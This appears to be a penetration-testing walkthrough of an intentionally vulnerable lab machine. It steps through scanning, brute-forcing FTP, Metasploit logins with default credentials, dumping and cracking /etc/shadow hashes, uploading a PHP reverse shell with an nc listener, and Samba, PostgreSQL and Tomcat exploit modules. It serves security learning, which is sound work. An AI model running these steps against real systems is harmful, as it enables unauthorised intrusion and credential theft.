We start our Pentest with scanning locally using any of both methods:

`sudo arp-scan -l`
<img width="1372" height="404" alt="Pasted image 20250918132150" src="https://github.com/user-attachments/assets/e27d7f73-110e-4d79-82cd-6283a3268263" />

`sudo netdiscover -i eth0 -r 10.0.2.0/24`
<img width="1180" height="313" alt="Pasted image 20250918132224" src="https://github.com/user-attachments/assets/bc7f3e6d-ea1b-4f72-b4bc-970898c2a6aa" />

the first 3 IPs are related to My Personal VM, so now we know that the victim's IP is
`10.0.2.8`

Let's Scan the IP we found using `nmap`

`sudo nmap -T4 -A 10.0.2.8`
<img width="1166" height="1166" alt="Pasted image 20250918132717" src="https://github.com/user-attachments/assets/f00f808c-8b55-4d75-9464-2f70bab17ad3" />

Notice many services are shown:
`ftp | ssh | telnet | smtp | domain | http | netbios-ssn | MySQL | postgresql | ajp13`

Lets search the version of each service used respectively.

1) `ftp | ProFTPD 1.3.1`
lets try to get in the ftp server by brute-forcing using hydra
<img width="2534" height="437" alt="Pasted image 20250922222947" src="https://github.com/user-attachments/assets/75873b68-246d-4b57-a761-40280e69c104" />



<img width="491" height="445" alt="Pasted image 20250922011929" src="https://github.com/user-attachments/assets/915a6fc9-ca8f-468e-8ae5-6807e08d8414" />

ok so now we know that there is 2 other users on this machine
`msfadmin` and `service` --> important

2) `ssh | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`

Try to access remotely via ssh, we'll use Metasploit

`use scanner/ssh/ssh_login`

set the required values like RHOSTS
let's try the default credentials from the usernames we found earlier
let's try `msfadmin` as username & password

<img width="2036" height="928" alt="Pasted image 20250922012505" src="https://github.com/user-attachments/assets/258004d0-ab5b-4389-9cc4-42981a2bee84" />

We're in as ROOT !

so I took the chance and viewed the `/etc/shadow` file to try to decrypt the password hashes of rest of the users

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.

sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0  =  batman

klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0  =  123456789

msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/  =  msfadmin

postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/  =  postgres

user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0  =  user

service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//  =  service

```

3) `telnet | Linux telnetd`
search for telnet_login on metasploit
`use auxiliary/scanner/telnet/telnet_login`

let's try the same credentials used in ssh, 
username: `msfadmin`
password: `msfadmin`

<img width="1204" height="994" alt="Pasted image 20250922012945" src="https://github.com/user-attachments/assets/9bf87528-930a-468b-a0e2-96bba5504af8" />

ROOT AGAIN!



4) `smtp | Postfix smtpd` 

let's try enumeration as well
`use auxiliary/scanner/smtp/smtp_enum`

<img width="2541" height="313" alt="Pasted image 20250922013854" src="https://github.com/user-attachments/assets/d376a44f-e43d-45e0-be73-2f34da0f2c7c" />


indeed useful Info


5) ` http | Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)`

lets start by fuzzing the ip

lets start by fuzzing the ip

```
gobuster dir -u http://10.0.2.8/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

<img width="1766" height="751" alt="Pasted image 20250922015504" src="https://github.com/user-attachments/assets/36075ee5-1a8f-49a2-a1dd-3ad54ed2292e" />


Some interesting directories.

The hosted web application on the target machine, on port 80, turned out to be a TikiWiki web application in which you can login to using the default credentials. Navigating through the web application, a file upload form that doesn't validate the input was revealed. We exploited this vulnerability to upload a reverse shell script and run it on the web application.

Default Credentials --> `admin | admin`

<img width="975" height="345" alt="Pasted image 20250922015728" src="https://github.com/user-attachments/assets/db7753e3-f9df-4f0f-a470-4679b61a3ec9" />
change the password and login again, we will notice a lot more things became accessible

<img width="2559" height="1159" alt="Pasted image 20250922015934" src="https://github.com/user-attachments/assets/4bb9853b-6925-4857-a69a-828336e7be82" />


One of which is a `Backup` site, lets go there and test for file upload vulnerability to execute a php reverse shell
`Open nc -vlnp 9001`
<img width="714" height="136" alt="Pasted image 20250922020640" src="https://github.com/user-attachments/assets/fa98f687-3dd5-423a-9d97-0c887edd7a6a" />

Upload the [Payload](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<img width="2046" height="496" alt="Pasted image 20250922020041" src="https://github.com/user-attachments/assets/75290d83-a066-4a76-8977-7d7dfa6afb64" />

Access it by changing the URL
<img width="1271" height="97" alt="Pasted image 20250922020607" src="https://github.com/user-attachments/assets/924ce0db-72f4-4e87-b0f9-1d5ae9c4a114" />


Voila!
<img width="683" height="240" alt="Pasted image 20250922020711" src="https://github.com/user-attachments/assets/9002d7d9-5afb-4b2d-ac9f-e02220f1d900" />


Can't Priv Esc! - dead end

6) `netbios-ssn Samba smbd 3.X - 4.X` | `netbios-ssn Samba smbd 3.0.20-Debian`

search on Metasploit
<img width="1615" height="856" alt="Pasted image 20250922230552" src="https://github.com/user-attachments/assets/c90ada6d-c2ff-45bf-9b42-a07721585c1a" />

run this module

<img width="997" height="777" alt="Pasted image 20250922230615" src="https://github.com/user-attachments/assets/71ef3a95-56c7-4a1a-a4a5-57fa6acd25da" />
ROOT Again!

7) `mysql  MySQL 5.0.51a-3ubuntu5`
lets try enum to try to login

<img width="833" height="267" alt="Pasted image 20250923000414" src="https://github.com/user-attachments/assets/6ccf068d-506e-47af-a348-f34932abd492" />


connect to MySQL
<img width="2239" height="668" alt="Pasted image 20250923000440" src="https://github.com/user-attachments/assets/8be94c96-e3c0-43f6-8e30-15833566bace" />

Done!


8) `postgresql  PostgreSQL DB 8.3.0 - 8.3.7`

search on Metasploit

<img width="1767" height="352" alt="Pasted image 20250923000655" src="https://github.com/user-attachments/assets/dceb4202-6fbe-4d68-9432-4b57434ed31b" />

Run
<img width="1522" height="661" alt="Pasted image 20250923000750" src="https://github.com/user-attachments/assets/e898e896-05bb-48b5-b486-c7481771491a" />


9) `Apache Tomcat/Coyote JSP engine 1.1`
```
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
```

search on Metasploit tomcat 5.5
<img width="2491" height="796" alt="Pasted image 20250923001029" src="https://github.com/user-attachments/assets/5c0d2266-22ac-4eed-bd48-f5990a5705e9" />

the `exploit/multi/http/tomcat_mgr_deploy` seems likely to work

<img width="1442" height="542" alt="Pasted image 20250923001234" src="https://github.com/user-attachments/assets/a6d81ec7-1087-4302-9126-8c6be4942334" />

DONE AND THANK YOU!
